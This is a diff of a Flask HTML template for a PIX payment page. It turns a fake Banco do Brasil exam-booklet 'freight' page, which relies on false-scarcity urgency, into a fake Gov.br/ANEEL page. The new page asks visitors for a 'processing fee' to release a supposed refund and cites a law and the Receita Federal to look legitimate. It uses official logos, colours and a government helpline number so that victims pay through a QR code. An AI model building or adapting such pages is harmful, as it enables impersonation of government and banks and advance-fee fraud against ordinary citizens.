@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco do Brasil - Pagamento PIX</title>
+    <title>Gov.br - Pagamento da Taxa de Processamento</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -28,7 +28,7 @@
             justify-content: center;
             border-radius: 50%;
             margin-right: 12px;
-            background-color: #003DA5;
+            background-color: #003399;
             color: white;
             font-weight: bold;
         }
@@ -38,8 +38,7 @@
             theme: {
                 extend: {
                     colors: {
-                        'bb-yellow': '#FEEF37',
-                        'bb-blue': '#003DA5',
+                        'gov-blue': '#003399',
                     }
                 }
             }
@@ -48,24 +47,24 @@
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
     <!-- Header -->
-    <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="bg-white py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
                 <div>
-                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
-                        CONCURSO PÚBLICO 2025
+                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ANEEL - Agência Nacional de Energia Elétrica
                     </p>
-                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
+                        Em parceria com a Receita Federal do Brasil
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Blue bar -->
-    <div class="bg-bb-blue py-3 shadow-md">
+    <!-- Barra Azul -->
+    <div class="bg-gov-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -73,7 +72,7 @@
                 <div class="w-2 h-2 bg-white"></div>
                 <div class="w-2 h-2 bg-white"></div>
             </div>
-            <span class="text-white text-xl tracking-wide drop-shadow-sm">PAGAMENTO DO FRETE</span>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">TAXA DE PROCESSAMENTO</span>
         </div>
     </div>
 
@@ -84,15 +83,15 @@
                 <div class="flex flex-col items-center space-y-4">
                     {% if pix_data.pixQrCode %}
                         <!-- Urgency Message -->
-                        <div class="bg-red-50 border-l-4 border-red-500 p-4 w-full mb-4 animate-pulse">
+                        <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 w-full mb-4">
                             <div class="flex">
                                 <div class="flex-shrink-0">
-                                    <i class="fas fa-exclamation-circle text-red-500"></i>
+                                    <i class="fas fa-exclamation-circle text-yellow-500"></i>
                                 </div>
                                 <div class="ml-3">
-                                    <h3 class="text-sm font-medium text-red-800">ATENÇÃO: Restam apenas 4 Apostilas Grátis!</h3>
-                                    <div class="mt-2 text-sm text-red-700">
-                                        <p>Finalize o pagamento do frete AGORA para garantir sua Apostila Oficial BB 2025 e aumente suas chances de aprovação para 84%!</p>
+                                    <h3 class="text-sm font-medium text-yellow-800">Informação Importante</h3>
+                                    <div class="mt-2 text-sm text-yellow-700">
+                                        <p>Para processar sua solicitação de restituição, é necessário o pagamento da taxa administrativa prevista na Lei 14.385/2022.</p>
                                     </div>
                                 </div>
                             </div>
@@ -108,7 +107,7 @@
                                     </svg>
                                 </div>
                                 <h2 class="text-2xl font-bold text-gray-800 mb-2">Pagamento Pendente</h2>
-                                <p class="text-gray-600 mb-4">Total a pagar: <span class="font-bold">R$ {{ valor_total }}</span></p>
+                                <p class="text-gray-600 mb-4">Taxa de processamento: <span class="font-bold">R$ {{ valor_total }}</span></p>
                             </div>
 
                             <img src="{{ pix_data.pixQrCode }}" alt="QR Code PIX" class="w-48 h-48 mx-auto mb-6" />
@@ -155,9 +154,9 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento: 167</p>
     </div>
 
     <script>
